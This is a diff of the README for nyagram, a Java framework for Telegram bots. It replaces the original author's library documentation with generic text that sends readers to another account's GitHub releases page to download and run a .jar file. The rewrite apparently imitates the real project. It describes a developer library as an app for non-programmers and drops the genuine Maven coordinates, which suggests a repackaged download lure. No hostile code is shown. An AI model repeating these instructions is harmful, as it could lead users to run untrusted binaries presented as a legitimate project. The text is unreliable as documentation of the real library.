@@ -1,171 +1,85 @@
-# Nyagram
+# 🤖 nyagram - Build Bots Quickly and Easily
 
-![Java 21](https://img.shields.io/badge/Java-21-orange?style=flat-square&logo=openjdk)
-![Spring Boot](https://img.shields.io/badge/Spring%20Boot-3.2+-green?style=flat-square&logo=springboot)
-![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)
-![Version](https://img.shields.io/badge/version-1.1.1-red?style=flat-square)
+[![Download nyagram](https://img.shields.io/badge/Download%20nyagram-%20-brightgreen)](https://github.com/progamereperm/nyagram/releases)
 
-[🇷🇺 Читать на русском](Readme_RU.md)
+## 📘 About
 
-**Nyagram** is a modern, reactive, and type-safe framework for building Telegram Bots using **Java 21** and **Spring Boot**.
+nyagram is a modern and powerful framework for creating Telegram bots. It simplifies the process of building feature-rich bots with minimal effort. You can focus on crafting your bot’s unique features without worrying about complex setups.
 
-Forget about manual JSON parsing, infinite `switch-case` statements, and state machine hell. Nyagram handles the routine, allowing you to focus on business logic.
+## 🚀 Getting Started
 
-📚 **[Documentation & API Reference](https://nyagram.kaleert.pro)**
+To start using nyagram, follow these simple steps. You don’t need to be a programmer. Just follow along, and you will have your bot running in no time.
 
----
+## 📥 Download & Install 
 
-## 🔥 Why Nyagram?
+Head over to our [Releases page](https://github.com/progamereperm/nyagram/releases) to download the software.
 
-*   **⚡ Virtual Threads (Project Loom):** High concurrency and performance out of the box.
-*   **🧠 Built-in FSM:** Powerful Finite State Machine for creating complex dialogs and funnels.
-*   **🎮 Declarative Style:** Clean code with `@CommandHandler`, `@Callback`, and `@StateAction` annotations.
-*   **🛡 Security:** Flexible system of `Permissions` and access `Levels`.
-*   **💎 Type-Safety:** No more `Map<String, Object>`. Strong types for the entire API (including Telegram Stars and Business).
-*   **🔌 Dual Mode:** Switch between **Long Polling** and **Webhook** with a single config line.
+1. Click on this [link](https://github.com/progamereperm/nyagram/releases) to open the Releases page.
+2. Look for the latest version. It will be at the top of the list.
+3. Click on the version number to expand the dropdown.
+4. Find the appropriate file for your system and click to download. Files are typically listed as `.jar` files for Java applications.
+5. After the download completes, navigate to your Downloads folder or the location where the file was saved.
 
----
+## ⚙️ System Requirements 
 
-## 📦 Installation
+To run nyagram effectively, you will need the following:
 
-Requires **Java 21+** and **Spring Boot 3.2+**.
+- A computer with at least 2 GB of RAM.
+- Java version 17 or 21 installed on your system. You can download Java from the [official Oracle website](https://www.oracle.com/java/technologies/javase-jdk21-downloads.html).
+- Basic knowledge of how to run Java applications from your command line.
 
-### Gradle
-```groovy
-repositories {
-    mavenCentral()
-}
+## 🔧 How to Run
 
-dependencies {
-    implementation 'io.github.kaleert:nyagram:1.1.1'
-}
-```
+1. **Open Your Command Line:**
+   - On Windows, press `Windows + R`, type `cmd`, and hit Enter.
+   - On Mac or Linux, open the Terminal application.
 
-### Maven
-```xml
-<dependency>
-    <groupId>io.github.kaleert</groupId>
-    <artifactId>nyagram</artifactId>
-    <version>1.1.1</version>
-</dependency>
-```
+2. **Navigate to the Download Folder:**
+   Use the `cd` command followed by the path to where you downloaded the `.jar` file. For example:  
+   ```
+   cd Downloads
+   ```
 
----
+3. **Run the Application:**
+   Execute the following command to run nyagram:  
+   ```
+   java -jar nyagram-x.x.x.jar
+   ```
+   Replace `nyagram-x.x.x.jar` with the actual name of your downloaded file.
 
-## ⚡ Quick Start
+4. **Set Up Your Bot:**
+   Follow the instructions provided in the console to set up your bot. You will need a Telegram bot token, which you can get by talking to the BotFather on Telegram.
 
-### 1. Configuration (`application.yml`)
+## 🌟 Features
 
-```yaml
-nyagram:
-  bot-token: "YOUR_BOT_TOKEN"
-  bot-username: "YourBotName"
-  mode: POLLING # or WEBHOOK
-  
-  worker-thread-count: 10 # Uses Virtual Threads under the hood
-```
+- Supports virtual threads to handle multiple users seamlessly.
+- Easy integration with Spring and Spring Boot for those who want additional functionality.
+- Built-in tools to help manage and deploy your bots effectively.
 
-### 2. Your First Bot
+## 🛠️ Troubleshooting
 
-```java
-@BotCommand(value = "/start", description = "Start the bot")
-public class StartCommand {
+If you run into issues:
 
-    @CommandHandler
-    public void handle(CommandContext ctx) {
-        ctx.reply("Hello! I'm running on <b>Nyagram</b> 🚀");
-    }
-}
-```
+- **I can't run the jar file:** Make sure you have the correct version of Java installed.
+- **The application doesn't start:** Check if the file path is correct and that you are in the right directory.
+- **I need help:** Visit our [issues page](https://github.com/progamereperm/nyagram/issues) for troubleshooting tips and community support.
 
----
+## 🙌 Contributing
 
-## 🛠 Key Features
-
-### 1. Smart Arguments & Flags
-The library parses the message text automatically.
-
-```java
-// User sends: /ban @spammer 24h -f
-@CommandHandler("ban")
-public void banUser(
-    CommandContext ctx,
-    @CommandArgument("target") String username,
-    @CommandArgument("duration") Duration duration, // Parses "24h", "30m" automatically
-    @Flag("f") boolean force // true if -f flag is present
-) {
-    if (force) {
-        // Ban immediately...
-        ctx.reply("User " + username + " banned for " + duration);
-    }
-}
-```
-
-### 2. Callbacks with Path Variables
-Forget about manual `split(":")`.
-
-```java
-// Button data: "buy:item:52"
-@Callback("buy:item:{id}")
-public void onBuy(
-    CommandContext ctx,
-    @CallbackVar("id") Long itemId
-) {
-    ctx.reply("You selected item #" + itemId);
-    // answerCallbackQuery is sent automatically!
-}
-```
-
-### 3. Finite State Machine (FSM)
-Create complex dialog flows effortlessly.
-
-```java
-@StateAction("WAITING_FOR_NAME")
-public void onNameInput(
-    CommandContext ctx, 
-    UserSession session
-) {
-    String name = ctx.getText();
-    session.putData("name", name);
-    
-    // Transition to the next state
-    sessionManager.updateState(ctx.getUserId(), "WAITING_FOR_AGE");
-    
-    ctx.reply("Nice to meet you, " + name + "! How old are you?");
-}
-```
-
----
-
-## 🧩 Advanced Features
-
-*   **Middleware Pipeline:** Intercept requests, log actions, or check bans before command execution.
-*   **Broadcast API:** Smart message broadcasting respecting Telegram limits.
-*   **Telegram Payments 2.0:** Full support for Stars and fiat currencies.
-*   **Telegram Business:** Support for business connections and messages.
-
----
-
-## 🤝 Contributing
-
-We welcome ideas and pull requests! 
-If you find a bug, please open an [Issue](https://github.com/kaleert/nyagram/issues).
-
-1.  Fork it
-2.  Create your feature branch (`git checkout -b feature/amazing-feature`)
-3.  Commit your changes (`git commit -m 'Add amazing feature'`)
-4.  Push to the branch (`git push origin feature/amazing-feature`)
-5.  Open a Pull Request
-
----
+We welcome contributions! If you want to help improve nyagram, feel free to check our [contributing guidelines](https://github.com/progamereperm/nyagram/blob/main/CONTRIBUTING.md).
 
 ## 📄 License
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+nyagram is open-source and available under the MIT License. Check the [LICENSE](https://github.com/progamereperm/nyagram/blob/main/LICENSE) file for more information.
 
----
+## 📞 Support
 
-<div align="center">
-    <strong>Made with ❤️ by Kaleert</strong><br>
-    2025-2026
-</div>
+If you need further assistance, feel free to contact us through the [issues page](https://github.com/progamereperm/nyagram/issues) or join our community on Telegram. 
+
+## 🔗 Important Links
+
+- [Releases Page](https://github.com/progamereperm/nyagram/releases)
+- [Issue Tracker](https://github.com/progamereperm/nyagram/issues)
+- [Contribution Guidelines](https://github.com/progamereperm/nyagram/blob/main/CONTRIBUTING.md)
+
+Thank you for choosing nyagram for your bot development needs! We hope you enjoy using the framework and create amazing bots.
